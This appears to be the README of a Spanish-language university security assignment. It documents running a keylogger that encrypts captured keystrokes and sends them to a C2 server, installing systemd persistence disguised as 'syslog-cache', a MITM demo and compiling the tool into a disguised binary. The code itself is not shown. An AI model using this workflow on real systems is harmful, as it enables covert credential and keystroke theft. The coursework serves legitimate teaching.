# Proyecto Unidad 2 - Seguridad Informática

## Estructura del proyecto

```
seguridad/
├── keylogger.py        → Ejercicios 1 y 2: Keylogger + Cifrado + Envío
├── server.py           → Ejercicio 2: Servidor C2 receptor/descifrador
├── mitm_demo.py        → Ejercicio 3: Demo ataque MITM
├── build.sh            → Ejercicio 3: Compilación con PyInstaller
└── informe_amenaza.md  → Ejercicio 4: Informe técnico de amenaza
```

---

## Requisitos de instalación (en la VM Linux)

```bash
pip install pynput cryptography requests pyinstaller
```

---

## Ejercicio 1 y 2 — Ejecutar el keylogger + servidor

### En la VM del atacante (primero):
```bash
python3 server.py --port 9999
```

### En la VM de la víctima:
```bash
# Ajustar la IP del atacante en el argumento --server
python3 keylogger.py --server 192.168.1.X:9999 --interval 30

# Para instalar persistencia (systemd):
python3 keylogger.py --install --server 192.168.1.X:9999

# Para ejecutar sin instalar persistencia (solo para demo):
python3 keylogger.py --server 192.168.1.X:9999 --no-persist
```

### Verificar persistencia (en VM víctima):
```bash
systemctl --user status syslog-cache.service
systemctl --user list-units --type=service | grep syslog
```

---

## Ejercicio 3 — Demo MITM + Compilación

### Demo MITM (3 terminales en loopback):
```bash
# Terminal 1: Servidor C2 real
python3 server.py --port 9999

# Terminal 2: Proxy MITM (intercepta y reenvía)
python3 mitm_demo.py --listen 8888 --forward 127.0.0.1:9999

# Terminal 3: Keylogger apuntando al MITM
python3 keylogger.py --server 127.0.0.1:8888 --no-persist --interval 10
```

El MITM mostrará los bytes cifrados interceptados e intentará descifrarlos
**sin la clave correcta**, demostrando que AES-256-GCM protege el contenido.

### Compilar a ejecutable:
```bash
chmod +x build.sh
./build.sh
# Resultado: dist/syslog-cache  (binario ELF standalone)
```

### Subir a VirusTotal:
```
https://www.virustotal.com/gui/file
→ subir dist/syslog-cache
→ capturar pantalla del resultado para el informe
```

---

## Ejercicio 4 — Informe técnico

Ver [informe_amenaza.md](./informe_amenaza.md)

---

## Justificación del cifrado (para la defensa)

| Pregunta | Respuesta |
|----------|-----------|
| **¿Por qué AES-256-GCM y no MD5?** | MD5 es función de hash unidireccional — no cifra ni permite recuperar el plaintext. AES-256-GCM es cifrado simétrico autenticado (AEAD): confidencialidad + integridad. |
| **¿Clave embebida o dinámica?** | La clave se deriva dinámicamente con PBKDF2-HMAC-SHA256 (200.000 iteraciones) desde una semilla. No está hardcoded en el binario como bytes de clave. |
| **¿Por qué PBKDF2 con 200.000 iteraciones?** | Hace costoso el ataque de diccionario: 200.000 iteraciones de SHA-256 por intento. Un atacante con GPU necesitaría tiempo considerable para probar millones de passwords. |
| **¿Por qué GCM y no CBC?** | GCM provee autenticación integrada (tag de 16B). Si el MITM modifica un byte del ciphertext, el tag falla y el receptor detecta la manipulación. |
| **¿Por qué nonce aleatorio de 12B por mensaje?** | Garantiza que el mismo plaintext produzca ciphertexts distintos cada vez. Reutilizar nonces con GCM es catastróficamente inseguro. |

---

## Limitaciones del keylogger (Ejercicio 1 - Análisis)

| Limitación | Razón técnica |
|------------|---------------|
| **Wayland puro (sin XWayland)** | pynput usa el backend X11 para interceptar eventos de teclado. En Wayland puro, los eventos se procesan en un compositor distinto y no son accesibles via X11. |
| **Campos de contraseña en algunos navegadores** | Algunos browsers en Wayland usan el protocolo input-method y no exponen los caracteres tecleados via X11 events. En X11, sí se capturan. |
| **Terminales en modo raw (vi, nano)** | Capturan las secuencias de escape (ej: `[A` para flecha arriba) en lugar del carácter intuitivo, dificultando la lectura del log. |
| **IME (métodos de entrada)** | Caracteres japoneses, chinos, coreanos se componen en varias teclas; el keylogger puede capturar las teclas intermedias pero no el carácter compuesto final. |
| **Teclado virtual / On-Screen Keyboard** | Los teclados virtuales en pantalla táctil no generan eventos X11 de la misma forma; pueden no ser capturados. |
